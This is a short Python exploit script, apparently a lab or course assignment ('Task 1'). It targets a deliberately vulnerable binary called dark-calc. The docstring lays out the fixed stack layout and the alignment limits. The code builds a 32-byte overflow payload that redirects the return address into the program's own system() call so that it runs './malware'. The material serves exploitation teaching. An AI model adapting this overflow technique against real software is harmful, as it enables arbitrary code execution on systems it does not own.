#!/usr/bin/env python3
"""Task 1 -- hijack the return address of input() in attack/dark-calc and run ./malware.

dark-calc is a non-PIE binary, and it also maps its own call stack at a *fixed*
address (init_fixed_stack(): mmap(0x721000000000, 0x802000, PROT_READ|WRITE|EXEC),
guarded by two PROT_NONE pages).  main() is reached through __wrap_main, which sets
rsp = fixed_stack_top (0x721000801000), so every frame always lives at the same
address:

    0x721000800fd0  expression[16]          <- buffer written by gets()
    0x721000800fe0  saved rbp
    0x721000800fe8  return address          <- overwritten by the overflow
    0x721000800ff0  main's saved rbp
    0x721000800ff8  __wrap_main's saved rip
    0x721000801000  guard page (PROT_NONE)  <- cannot be written, not even by the
                                               NUL that gets() appends

Two facts constrain the payload:

 1. Only three qwords above the return address are writable, so a full ROP chain
    ([ret][pop rdi][arg][system]) does not fit -- six bytes are missing.
 2. system() must be entered with rsp % 16 == 8 (it uses movaps on the stack).
    Entering it with a plain `ret` from slot 0x...ff8 gives rsp % 16 == 0 and
    segfaults inside do_system().

The way out is to return into the middle of eval(), right at its `mov edi,
0x6030d0; call system@plt` sequence (0x401a6b).  The program itself supplies the
argument (the global command_buf, already filled by strcpy()) and the call
instruction pushes the return address, so the 16-byte alignment is correct by
construction.  command_buf then holds "./malware", which is exactly what we want
system() to run.
"""
import sys
import struct

POP_EVAL_SYSTEM = 0x401A6B   # eval+0x94: mov edi, 0x6030d0 ; call system@plt
COMMAND_BUF = 0x6030D0       # global char command_buf[], filled by strcpy()
QUESTION = b"./malware"      # copied into command_buf above

p64 = lambda x: struct.pack("<Q", x)

payload = QUESTION + b"\x00"
payload += b"A" * (16 - len(payload))          # pad up to the saved rbp slot
payload += p64(0xDEADBEEFDEADBEEF)             # saved rbp (never used again)
payload += p64(POP_EVAL_SYSTEM)                # return into eval's system() call

assert len(payload) == 32
assert b"\n" not in payload
sys.stdout.buffer.write(payload)
